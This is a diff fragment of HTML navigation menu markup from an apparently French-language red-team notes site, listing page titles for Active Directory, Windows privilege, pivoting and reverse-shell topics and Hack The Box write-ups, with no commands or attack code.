+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_6_4_3_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_4_3_6">
+            <span class="md-nav__icon md-icon"></span>
+            ACE ACL DACL
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/4%20-%20Windows/Active%20Directory/ACE%20ACL%20DACL/ExtendedRight%20-%20User-Force-Change-Password/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    ExtendedRight   User Force Change Password
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/4%20-%20Windows/Active%20Directory/ACE%20ACL%20DACL/GenericAll/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    GenericAll
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/4%20-%20Windows/Active%20Directory/ACE%20ACL%20DACL/GenericWrite%20-%20GenericAll/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    GenericWrite   GenericAll
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/4%20-%20Windows/Active%20Directory/ACE%20ACL%20DACL/Self-membership%20-%20WriteProperty/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Self membership   WriteProperty
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/4%20-%20Windows/Active%20Directory/ACE%20ACL%20DACL/WriteDACL%20%2B%20WriteOwner/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    WriteDACL + WriteOwner
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_4_3_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_4_3_7" id="__nav_6_4_3_7_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    ADCS
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_6_4_3_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_4_3_7">
+            <span class="md-nav__icon md-icon"></span>
+            ADCS
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/4%20-%20Windows/Active%20Directory/ADCS/Enumeration/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Enumeration
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_4_3_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_4_3_8" id="__nav_6_4_3_8_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Enumeration
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_6_4_3_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_4_3_8">
+            <span class="md-nav__icon md-icon"></span>
+            Enumeration
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/4%20-%20Windows/Active%20Directory/Enumeration/Depuis%20Linux/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Depuis Linux
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/4%20-%20Windows/Active%20Directory/Enumeration/Depuis%20Windows/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Depuis Windows
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_4_3_9" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_4_3_9" id="__nav_6_4_3_9_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Groupes
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_6_4_3_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_4_3_9">
+            <span class="md-nav__icon md-icon"></span>
+            Groupes
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/4%20-%20Windows/Active%20Directory/Groupes/Backup%20Operator/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Backup Operator
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/4%20-%20Windows/Active%20Directory/Groupes/Dnsadmin/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Dnsadmin
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/4%20-%20Windows/Active%20Directory/Groupes/Print%20Operator/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Print Operator
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/4%20-%20Windows/Active%20Directory/Groupes/Server%20Operators/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Server Operators
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_4_3_10" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_4_3_10" id="__nav_6_4_3_10_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Trust
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_6_4_3_10_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_4_3_10">
+            <span class="md-nav__icon md-icon"></span>
+            Trust
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/4%20-%20Windows/Active%20Directory/Trust/Bidirectionnal/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Bidirectionnal
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_4_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_4_4" id="__nav_6_4_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Privilèges
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_6_4_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_4_4">
+            <span class="md-nav__icon md-icon"></span>
+            Privilèges
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/4%20-%20Windows/Privil%C3%A8ges/Always%20Install%20Elevated/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Always Install Elevated
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/4%20-%20Windows/Privil%C3%A8ges/Compte%20de%20service%20avec%20peu%20de%20privil%C3%A8ges/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Compte de service avec peu de privilèges
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/4%20-%20Windows/Privil%C3%A8ges/Event%20log%20reader/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Event log reader
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/4%20-%20Windows/Privil%C3%A8ges/Named%20Pipe/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Named Pipe
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/4%20-%20Windows/Privil%C3%A8ges/SeBackup/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SeBackup
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/4%20-%20Windows/Privil%C3%A8ges/SeDebug/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SeDebug
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/4%20-%20Windows/Privil%C3%A8ges/SeImpersonate/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SeImpersonate
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/4%20-%20Windows/Privil%C3%A8ges/SeTakeOwnership/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SeTakeOwnership
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_5" id="__nav_6_5_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    5   Réseau
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_5">
+            <span class="md-nav__icon md-icon"></span>
+            5   Réseau
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/5%20-%20R%C3%A9seau/D%C3%A9couverte%20d%27h%C3%B4tes/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Découverte d'hôtes
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/5%20-%20R%C3%A9seau/Pivot%20via%20Chisel/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Pivot via Chisel
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/5%20-%20R%C3%A9seau/Pivot%20via%20Ligolo-ng/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Pivot via Ligolo ng
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/5%20-%20R%C3%A9seau/Pivot%20via%20SSH/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Pivot via SSH
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/5%20-%20R%C3%A9seau/Port%20forwarding%20via%20SSH/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Port forwarding via SSH
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_5_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_5_6" id="__nav_6_5_6_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Wifi
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_6_5_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_5_6">
+            <span class="md-nav__icon md-icon"></span>
+            Wifi
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/5%20-%20R%C3%A9seau/Wifi/Wifite/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Wifite
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_6" id="__nav_6_6_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    6   Misc
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_6">
+            <span class="md-nav__icon md-icon"></span>
+            6   Misc
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/6%20-%20Misc/Cr%C3%A9ation%20de%20wordlists/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Création de wordlists
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/6%20-%20Misc/Format%20hash%20john%20the%20ripper/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Format hash john the ripper
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/6%20-%20Misc/MagicByte/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    MagicByte
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/6%20-%20Misc/Msfvenom/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Msfvenom
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_6_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_6_5" id="__nav_6_6_5_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Deserialization
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_6_6_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_6_5">
+            <span class="md-nav__icon md-icon"></span>
+            Deserialization
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/6%20-%20Misc/Deserialization/Net/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Net
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_6_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_6_6" id="__nav_6_6_6_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Exploits divers
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_6_6_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_6_6">
+            <span class="md-nav__icon md-icon"></span>
+            Exploits divers
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/6%20-%20Misc/Exploits%20divers/VisualStudio/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    VisualStudio
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_6_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_6_7" id="__nav_6_6_7_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Reverse shell
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_6_6_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_6_7">
+            <span class="md-nav__icon md-icon"></span>
+            Reverse shell
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/6%20-%20Misc/Reverse%20shell/Spawn%20shell/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Spawn shell
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_6_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_6_8" id="__nav_6_6_8_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Secrets
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_6_6_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_6_8">
+            <span class="md-nav__icon md-icon"></span>
+            Secrets
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/6%20-%20Misc/Secrets/Ansible%20Vault/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Ansible Vault
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/6%20-%20Misc/Secrets/Cli-xml/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Cli xml
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/6%20-%20Misc/Secrets/Vault/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Vault
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_6_9" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_6_9" id="__nav_6_6_9_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Transfert de fichiers
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_6_6_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_6_9">
+            <span class="md-nav__icon md-icon"></span>
+            Transfert de fichiers
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/6%20-%20Misc/Transfert%20de%20fichiers/Diff%C3%A9rents%20langages/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Différents langages
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/6%20-%20Misc/Transfert%20de%20fichiers/Linux%20vers%20linux/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux vers linux
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/6%20-%20Misc/Transfert%20de%20fichiers/Serveurs%20temporaires/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Serveurs temporaires
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/6%20-%20Misc/Transfert%20de%20fichiers/T%C3%A9l%C3%A9charger%20depuis%20Windows/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Télécharger depuis Windows
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/6%20-%20Misc/Transfert%20de%20fichiers/Uploader%20depuis%20Windows/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Uploader depuis Windows
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Writeup
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            Writeup
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_7_1" id="__nav_7_1_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    HTB
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7_1">
+            <span class="md-nav__icon md-icon"></span>
+            HTB
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_1_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_7_1_1" id="__nav_7_1_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Machines
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_7_1_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7_1_1">
+            <span class="md-nav__icon md-icon"></span>
+            Machines
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Bank/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Bank
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Chatterbox/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Chatterbox
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Escape/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Escape
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Legacy/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Legacy
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Manager
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Manager
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table des matières">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table des matières
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#nmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      Nmap:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#operator" class="md-nav__link">
+    <span class="md-ellipsis">
+      Operator
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xp_dirtree" class="md-nav__link">
+    <span class="md-ellipsis">
+      xp_dirtree
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#raven" class="md-nav__link">
+    <span class="md-ellipsis">
+      Raven
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privesc-admin-esc7" class="md-nav__link">
+    <span class="md-ellipsis">
+      Privesc Admin - ESC7
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Pov/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Pov
+  </span>
+  
+
+      </a>
